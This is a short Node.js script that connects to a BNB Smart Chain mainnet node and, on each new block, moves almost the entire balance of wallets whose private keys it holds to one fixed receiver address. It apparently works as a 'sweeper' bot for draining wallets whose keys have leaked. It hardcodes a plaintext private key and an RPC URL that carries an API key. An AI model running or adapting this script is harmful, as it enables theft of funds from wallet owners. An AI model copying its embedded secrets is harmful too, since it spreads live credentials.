const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider("https://speedy-nodes-nyc.moralis.io/9c62ce2fe06b0dcc86ea2630/bsc/mainnet")

const addressReceiver = '0x1dF6454068164A0D27c5aca14431BaB05D3CC39F'

const privateKeys = ["be2d9983cede1953c87626e811fc373915b35acebde409573d3f19dac1f0c79e"]


const gasPrice = 5


const bot = async =>{
    provider.on('block', async () => {
        console.log('Listening to new block, waiting ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const txBuffer = ethers.utils.parseEther("0.002");
            
            if (balance.sub(txBuffer) > 0){
                console.log("New Account with Eth!");
                const amount = balance.sub(txBuffer);
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount,
                        gasPrice: gasPrice * 1000000000,
                        gasLimit: 21000
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();
